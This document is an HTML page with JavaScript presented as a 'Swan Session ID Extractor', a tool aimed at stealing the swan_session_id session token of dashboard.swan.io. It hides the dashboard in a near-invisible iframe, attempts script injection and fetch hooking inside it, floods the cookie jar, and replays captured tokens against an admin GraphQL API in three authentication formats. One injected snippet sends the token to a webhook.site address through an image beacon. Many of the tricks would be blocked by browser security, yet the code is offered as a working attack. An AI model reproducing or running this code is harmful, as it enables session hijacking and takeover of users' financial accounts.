<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Swan Session Extractor</title>
    <style>
        body { font-family: system-ui, sans-serif; margin: 20px; line-height: 1.6; }
        pre { background: #f5f5f5; padding: 15px; overflow: auto; max-height: 400px; }
        .success { color: green; font-weight: bold; }
        .error { color: red; }
        .warning { color: orange; }
        button { 
            background: #3498db; 
            color: white; 
            border: none; 
            padding: 10px 15px; 
            margin: 5px 0;
            cursor: pointer;
            border-radius: 4px; 
        }
        button:hover { background: #2980b9; }
        .token { 
            word-break: break-all; 
            background: #f8f8f8;
            padding: 10px;
            border: 1px solid #ddd;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <h1>Swan Session ID Extractor</h1>
    <p>This tool specifically extracts the <code>swan_session_id</code> token from dashboard.swan.io</p>
    
    <div>
        <button onclick="extractFromCookies()">Extract from Cookies</button>
        <button onclick="extractFromStorage()">Extract from Storage</button>
        <button onclick="loadDashboardFrame()">Load Dashboard in Frame</button>
        <button onclick="cookieJarOverflow()">Try Cookie Jar Overflow</button>
    </div>
    
    <h2>Extraction Results:</h2>
    <pre id="log">Ready to extract swan_session_id...</pre>
    
    <script>
        // Logging utility
        function log(message, className) {
            const element = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.textContent = `[${timestamp}] ${message}`;
            if (className) entry.className = className;
            element.appendChild(entry);
            console.log(`[${timestamp}] ${message}`);
        }
        
        // Process extracted token
        function processToken(token, source) {
            if (!token) return false;
            
            log(`Found swan_session_id from ${source}:`, "success");
            log(token, "token");
            
            // Create copy button
            const btnContainer = document.createElement('div');
            btnContainer.innerHTML = `
                <button onclick="navigator.clipboard.writeText('${token}').then(() => alert('Token copied!'))">
                    Copy Token
                </button>
                <button onclick="testToken('${token}')">
                    Test Token
                </button>
            `;
            document.getElementById('log').appendChild(btnContainer);
            
            return true;
        }
        
        // Test token against API
        async function testToken(token) {
            log("Testing swan_session_id token against API...");
            
            try {
                // Test as cookie
                document.cookie = `swan_session_id=${token}; domain=.swan.io; path=/;`;
                
                // Make request to API with credentials
                const response = await fetch("https://api.swan.io/admin-auth/graphql", {
                    method: "POST",
                    credentials: "include",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        query: "{ user { id mobilePhoneNumber } }"
                    })
                });
                
                const text = await response.text();
                log(`API Response Status: ${response.status} ${response.statusText}`);
                log(`API Response: ${text}`);
                
                if (response.ok && !text.includes("Unauthenticated context forbidden")) {
                    log("✅ Token works as session cookie!", "success");
                } else {
                    log("❌ Token doesn't work as session cookie", "error");
                    
                    // Try as X-Swan-Authenticator-Token
                    const response2 = await fetch("https://api.swan.io/admin-auth/graphql", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-Swan-Authenticator-Token": token
                        },
                        body: JSON.stringify({
                            query: "{ user { id mobilePhoneNumber } }"
                        })
                    });
                    
                    const text2 = await response2.text();
                    log(`X-Swan-Authenticator-Token Test: ${response2.status}`);
                    
                    if (response2.ok && !text2.includes("Unauthenticated context forbidden")) {
                        log("✅ Token works as X-Swan-Authenticator-Token!", "success");
                    } else {
                        log("❌ Token doesn't work as X-Swan-Authenticator-Token", "error");
                        
                        // Try as Bearer token
                        const response3 = await fetch("https://api.swan.io/admin-auth/graphql", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                "Authorization": `Bearer ${token}`
                            },
                            body: JSON.stringify({
                                query: "{ user { id mobilePhoneNumber } }"
                            })
                        });
                        
                        const text3 = await response3.text();
                        log(`Bearer Token Test: ${response3.status}`);
                        
                        if (response3.ok && !text3.includes("Unauthenticated context forbidden")) {
                            log("✅ Token works as Bearer token!", "success");
                        } else {
                            log("❌ Token validation failed in all formats", "error");
                        }
                    }
                }
            } catch (e) {
                log(`Token test error: ${e.message}`, "error");
            }
        }
        
        // Extract from cookies
        function extractFromCookies() {
            log("Checking for swan_session_id in cookies...");
            
            // Get all cookies
            const cookies = document.cookie.split(';');
            let found = false;
            
            for (const cookie of cookies) {
                const [name, value] = cookie.trim().split('=');
                
                if (name === 'swan_session_id') {
                    found = true;
                    processToken(value, 'document.cookie');
                }
            }
            
            if (!found) {
                log("No swan_session_id found in cookies for this domain", "warning");
                log("This is expected since cookies are domain-restricted", "info");
            }
            
            // Check if we can create a test cookie
            try {
                document.cookie = "test_cookie=1; path=/;";
                const testCookie = document.cookie.includes("test_cookie=1");
                log(`Cookie creation test: ${testCookie ? "Successful" : "Failed"}`, testCookie ? "success" : "error");
                
                // Try to set cookie for swan.io domain
                document.cookie = "swan_test=1; domain=.swan.io; path=/;";
                log("Attempted to set cross-domain cookie. This will likely fail due to security restrictions.", "info");
            } catch (e) {
                log(`Cookie manipulation error: ${e.message}`, "error");
            }
        }
        
        // Extract from localStorage and sessionStorage
        function extractFromStorage() {
            log("Checking for swan_session_id in browser storage...");
            let found = false;
            
            // Check localStorage
            try {
                const localStorageValue = localStorage.getItem('swan_session_id');
                if (localStorageValue) {
                    found = true;
                    processToken(localStorageValue, 'localStorage');
                }
            } catch (e) {
                log(`localStorage error: ${e.message}`, "error");
            }
            
            // Check sessionStorage
            try {
                const sessionStorageValue = sessionStorage.getItem('swan_session_id');
                if (sessionStorageValue) {
                    found = true;
                    processToken(sessionStorageValue, 'sessionStorage');
                }
            } catch (e) {
                log(`sessionStorage error: ${e.message}`, "error");
            }
            
            if (!found) {
                log("No swan_session_id found in browser storage", "warning");
                
                // Scan for any potential tokens
                log("Scanning all storage for potential session data...");
                
                // Look in localStorage
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key.toLowerCase().includes('swan') || key.toLowerCase().includes('session')) {
                            const value = localStorage.getItem(key);
                            log(`Found potential item: ${key}`, "info");
                            if (value && value.length > 20) {
                                log(`Value (preview): ${value.substring(0, 20)}...`);
                            }
                        }
                    }
                } catch (e) {
                    log(`Storage scan error: ${e.message}`, "error");
                }
                
                // Manual entry form
                const manualDiv = document.createElement('div');
                manualDiv.innerHTML = `
                    <div style="margin-top: 15px; padding: 10px; border: 1px solid #ddd; background: #f8f8f8;">
                        <h3>Manual Token Entry</h3>
                        <p>Please enter the swan_session_id obtained from dashboard.swan.io cookies:</p>
                        <input type="text" id="manualToken" placeholder="Paste swan_session_id here" style="width: 100%; padding: 8px;">
                        <button onclick="processManualToken()" style="margin-top: 10px;">Process Token</button>
                    </div>
                `;
                document.getElementById('log').appendChild(manualDiv);
                
                // Add global function for the button
                window.processManualToken = function() {
                    const token = document.getElementById('manualToken').value.trim();
                    if (token) {
                        processToken(token, 'manual-entry');
                    } else {
                        log("Please enter a token", "error");
                    }
                };
            }
        }
        
        // Load dashboard in iframe
        function loadDashboardFrame() {
            log("Loading dashboard.swan.io in an iframe to extract swan_session_id...");
            
            // Create iframe
            const iframe = document.createElement('iframe');
            iframe.style.width = "1px";
            iframe.style.height = "1px";
            iframe.style.position = "absolute";
            iframe.style.opacity = "0.01";
            iframe.src = "https://dashboard.swan.io";
            
            // Set up message listener
            window.addEventListener('message', (event) => {
                if (event.source === iframe.contentWindow) {
                    log(`Received message from iframe: ${JSON.stringify(event.data)}`, "success");
                    
                    if (event.data && event.data.swan_session_id) {
                        processToken(event.data.swan_session_id, 'iframe-message');
                    }
                }
            });
            
            // Add to document
            document.body.appendChild(iframe);
            
            // When iframe loads, try to extract cookies
            iframe.onload = () => {
                log("Dashboard iframe loaded, attempting to extract swan_session_id...");
                
                try {
                    // Try to access iframe content (will likely fail due to CORS)
                    const extractScript = `
                        try {
                            // Get swan_session_id from cookies
                            const cookies = document.cookie.split(';');
                            for (const cookie of cookies) {
                                const [name, value] = cookie.trim().split('=');
                                if (name === 'swan_session_id') {
                                    window.parent.postMessage({ swan_session_id: value }, '*');
                                }
                            }
                            
                            // Look in storage
                            const localValue = localStorage.getItem('swan_session_id');
                            if (localValue) {
                                window.parent.postMessage({ swan_session_id: localValue, source: 'localStorage' }, '*');
                            }
                            
                            const sessionValue = sessionStorage.getItem('swan_session_id');
                            if (sessionValue) {
                                window.parent.postMessage({ swan_session_id: sessionValue, source: 'sessionStorage' }, '*');
                            }
                            
                            // Send all cookie data for analysis
                            window.parent.postMessage({ allCookies: document.cookie }, '*');
                            
                            // Set up request monitoring
                            const origFetch = window.fetch;
                            window.fetch = function(...args) {
                                try {
                                    const url = args[0]?.url || args[0];
                                    if (url.includes('swan.io')) {
                                        console.log("Swan fetch detected:", url);
                                        // Get cookies again after each request
                                        setTimeout(() => {
                                            const cookies = document.cookie.split(';');
                                            for (const cookie of cookies) {
                                                const [name, value] = cookie.trim().split('=');
                                                if (name === 'swan_session_id') {
                                                    window.parent.postMessage({ swan_session_id: value, source: 'post-fetch' }, '*');
                                                }
                                            }
                                        }, 500);
                                    }
                                } catch (e) {}
                                return origFetch.apply(this, args);
                            };
                        } catch (e) {
                            console.error("Extraction error:", e);
                        }
                    `;
                    
                    // Try to inject script (likely to fail)
                    try {
                        iframe.contentWindow.eval(extractScript);
                        log("Extraction script injected successfully", "success");
                    } catch (e) {
                        log(`Script injection failed: ${e.message}`, "error");
                        log("This is expected due to cross-origin restrictions", "info");
                    }
                } catch (e) {
                    log(`Iframe content access error: ${e.message}`, "error");
                }
                
                // Display instructions for manual extraction
                const instructionsDiv = document.createElement('div');
                instructionsDiv.innerHTML = `
                    <div style="margin-top: 15px; padding: 10px; border: 1px solid #ddd; background: #f8f8f8;">
                        <h3>Manual Extraction Instructions:</h3>
                        <ol>
                            <li>Open <a href="https://dashboard.swan.io" target="_blank">dashboard.swan.io</a> in a new tab</li>
                            <li>Login to your account</li>
                            <li>Open browser Developer Tools (F12)</li>
                            <li>Go to Application → Cookies → dashboard.swan.io</li>
                            <li>Find the <code>swan_session_id</code> cookie and copy its value</li>
                            <li>Paste it into the form below:</li>
                        </ol>
                        <input type="text" id="manualCookie" placeholder="Paste swan_session_id cookie value here" style="width: 100%; padding: 8px;">
                        <button onclick="processCookieValue()" style="margin-top: 10px;">Process Cookie</button>
                    </div>
                `;
                document.getElementById('log').appendChild(instructionsDiv);
                
                // Add global function for the button
                window.processCookieValue = function() {
                    const cookie = document.getElementById('manualCookie').value.trim();
                    if (cookie) {
                        processToken(cookie, 'manual-cookie-entry');
                    } else {
                        log("Please enter a cookie value", "error");
                    }
                };
            };
            
            // Remove iframe after a while
            setTimeout(() => {
                document.body.removeChild(iframe);
                log("Removed dashboard iframe", "info");
            }, 30000);
        }
        
        // Try cookie jar overflow technique
        function cookieJarOverflow() {
            log("Attempting cookie jar overflow technique...", "warning");
            
            // Create iframe pointing to dashboard
            const iframe = document.createElement('iframe');
            iframe.style.width = "1px";
            iframe.style.height = "1px";
            iframe.style.position = "absolute";
            iframe.style.opacity = "0.01";
            iframe.src = "https://dashboard.swan.io";
            document.body.appendChild(iframe);
            
            // Set up message listener
            window.addEventListener('message', (event) => {
                if (event.source === iframe.contentWindow) {
                    if (event.data && event.data.swan_session_id) {
                        processToken(event.data.swan_session_id, 'cookie-overflow');
                    }
                }
            });
            
            // When iframe loads
            iframe.onload = () => {
                log("Dashboard iframe loaded for cookie overflow...");
                
                // Try to create many cookies to overflow the jar
                for (let i = 0; i < 100; i++) {
                    document.cookie = `overflow_${i}=value_${i}; path=/;`;
                }
                
                log("Created overflow cookies", "info");
                
                // Try special techniques for cookie domain sharing
                try {
                    // Try setting cookie for parent domain
                    document.cookie = "swan_bridge=1; domain=.swan.io; path=/;";
                    
                    // Try URL encoded domain
                    document.cookie = "swan_bridge_encoded=1; domain=%2Eswan%2Eio; path=/;";
                    
                    // Try setting document.domain
                    try {
                        document.domain = "swan.io";
                        log("Set document.domain = swan.io", "success");
                    } catch (e) {
                        log(`Failed to set document.domain: ${e.message}`, "error");
                    }
                    
                    log("Attempted special cookie techniques", "info");
                } catch (e) {
                    log(`Cookie technique error: ${e.message}`, "error");
                }
                
                // Check if we can access the iframe's cookies now
                setTimeout(() => {
                    try {
                        const iframeCookies = iframe.contentDocument.cookie;
                        log(`Success! Got iframe cookies: ${iframeCookies}`, "success");
                        
                        // Look for swan_session_id
                        const cookies = iframeCookies.split(';');
                        for (const cookie of cookies) {
                            const [name, value] = cookie.trim().split('=');
                            if (name === 'swan_session_id') {
                                processToken(value, 'iframe-cookie-access');
                            }
                        }
                    } catch (e) {
                        log(`Iframe cookie access error: ${e.message}`, "error");
                        log("This is expected due to browser security restrictions", "info");
                    }
                }, 1000);
                
                // Alternative: Try to inject a script to send cookies
                try {
                    const extractScript = `
                        try {
                            // Extract cookies
                            const cookies = document.cookie.split(';');
                            let swanSessionId = null;
                            
                            for (const cookie of cookies) {
                                const [name, value] = cookie.trim().split('=');
                                if (name === 'swan_session_id') {
                                    swanSessionId = value;
                                    break;
                                }
                            }
                            
                            if (swanSessionId) {
                                // Send message to parent window
                                window.parent.postMessage({ swan_session_id: swanSessionId }, '*');
                                
                                // Also try sending via image beacon
                                const img = new Image();
                                img.src = 'https://webhook.site/YOUR-WEBHOOK-ID?token=' + encodeURIComponent(swanSessionId);
                            }
                        } catch (e) {
                            console.error("Extraction error:", e);
                        }
                    `;
                    
                    try {
                        iframe.contentWindow.eval(extractScript);
                    } catch (e) {
                        log(`Script injection error: ${e.message}`, "error");
                    }
                } catch (e) {
                    log(`Script preparation error: ${e.message}`, "error");
                }
            };
            
            // Remove iframe after a while
            setTimeout(() => {
                document.body.removeChild(iframe);
                log("Removed overflow iframe", "info");
            }, 30000);
        }
        
        // Initial message
        log("Ready to extract swan_session_id. Please click a button to begin.");
    </script>
</body>
</html>
